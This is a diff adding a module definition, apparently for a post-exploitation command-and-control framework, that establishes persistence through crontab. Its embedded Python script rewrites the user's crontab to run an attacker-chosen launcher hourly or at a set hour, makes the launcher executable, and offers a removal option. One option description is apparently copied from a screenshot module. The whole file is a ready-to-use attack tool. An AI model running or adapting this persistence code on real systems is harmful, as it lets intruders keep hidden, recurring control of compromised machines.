@@ -1,0 +1,64 @@
+name: Persistence with crontab
+authors:
+  - '@424f424f'
+description: This module establishes persistence via crontab
+software: ''
+techniques:
+  - T1168
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: false
+language: python
+min_language_version: '2.6'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to grab a screenshot from.
+    required: true
+    value: ''
+  - name: Remove
+    description: Remove Persistence. True/False
+    required: false
+    value: ''
+  - name: Hourly
+    description: Hourly persistence.
+    required: false
+    value: ''
+  - name: Hour
+    description: Hour to callback. 24hr format.
+    required: false
+    value: ''
+  - name: FileName
+    description: File name for the launcher.
+    required: true
+    value: ''
+script: |
+  import subprocess
+  import sys
+  Remove = "{{ Remove }}"
+  Hourly = "{{ Hourly }}"
+  Hour = "{{ Hour }}"
+
+
+  if Remove == "True":
+      cmd = 'crontab -l | grep -v "{{ FileName }}"  | crontab -'
+      print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+      print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+      print("Finished")
+
+  else:
+      if Hourly == "True":
+          cmd = 'crontab -l | { cat; echo "0 * * * * {{ FileName }}"; } | crontab -'
+          print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+          print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+          print(subprocess.Popen('chmod +x {{ FileName }}', shell=True, stdout=subprocess.PIPE).stdout.read())
+          print("Finished")
+
+      elif Hour:
+              cmd = 'crontab -l | { cat; echo "0 {{ Hour }} * * * {{ FileName }}"; } | crontab -'
+              print(subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE).stdout.read())
+              print(subprocess.Popen('crontab -l', shell=True, stdout=subprocess.PIPE).stdout.read())
+              print(subprocess.Popen('chmod +x {{ FileName }}', shell=True, stdout=subprocess.PIPE).stdout.read())
+              print("Finished")
